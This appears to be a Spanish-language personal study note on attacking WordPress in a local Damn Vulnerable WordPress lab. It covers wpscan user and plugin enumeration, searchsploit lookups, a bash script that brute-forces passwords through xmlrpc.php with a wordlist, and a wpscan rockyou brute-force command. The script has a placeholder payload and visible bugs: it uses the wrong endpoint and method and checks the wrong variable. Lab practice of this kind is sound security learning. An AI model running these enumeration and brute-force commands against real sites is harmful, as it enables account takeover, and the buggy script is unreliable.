> WordPress es un **Sistema de Gestión de Contenidos (CMS) gratuito y de código abierto que permite crear y administrar sitios web (blogs, tiendas online, portafolios, etc.) de forma sencilla, sin necesidad de programar, usando temas y plugins para personalizarlo fácilmente**, y es la plataforma más usada a nivel mundial para crear páginas web. Sirve para publicar contenido, gestionar usuarios y funcionalidades avanzadas, siendo ideal para proyectos personales o negocios en línea.

## Herramientas
- [[Damn Vulnerable WordPress]]
- [[searchsploid]]
- [[wpscan]]

## Caso practico
Descargamos DVWP y ejecutas esto:
```bash
cd dvwp/
docker compose up -d --build
```

Ingresas a `localhost:3337`, te logues y toda la wea
- Ahora si podes:
```
docker compose run --rm wp-cli install-wp
```

> Primer observacion: la version de wordpress esta desactualizada, en el login te dice cuando el usuario es correcto pero la contrasenia no, podemos ennumerar los usuarios.

Con herramientas como [[whatweb]], wpscan podemos averiguar extras.

## Con wpscan
```
wpscan --url https://127.0.0.1:31337 -e vp,u
```
- `-e` oye ennumerame `vp` plugins vulnerables y `u` usuarios

- Para realizar escaneos de mejor calidad se utilizan api-tokens dentro de la web de wpscan, con una cuenta, Profile > Token.
`wpscan --url https://127.0.0.1:31337 -e vp --api-token="api-token"`

## Regex con grep
`curl -s -X GET 'https://localhost:31337/' | grep -oP 'plugins/\K[^/]+ | sort -u`

## Searchsploit
Podemos obtener vulnerabilidades para determinadas tecnologias y sus versiones
Warfare es uno de los plugins de wordpress que estaba desactualizado:
`searchsploit warfare`

## Vulnerabilidad
Hay una forma de ennumerar usuarios a traves de un archivo:
`xmlrpc.php` si esta expuesto chau
`curl -s -X POST 'http://localhost:31337/xmlrpc.php' -d@file.xml`

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "/nSaliendo/n/n"
	exit 1
}

trap ctrl_c SIGINT

function createXML(){
	passwd=$1
	textXML="""
	codigo xml malicioso
	codigo
	codigo
	$passwd
	codigo
	"""
	echo $textXML > file.xml
	
	response=$(curl -s -X GET https://localhost:31337/wp-admin.php -d@file.xml)
	
	if [ ! "$(echo "$textXML" | grep 'Invalid password')" ]; then
		echo -e "La contrasenia valida es $passwd"
		exit 0
	fi
}

cat /usr/share/SecList/Passwords.txt | while read password; do
	createXML $password
done

```
## Fuerza bruta
`wpscan --url https://127.0.0.1:31337 -U savitar -P usr/share/wordlist/rockyou.txt`

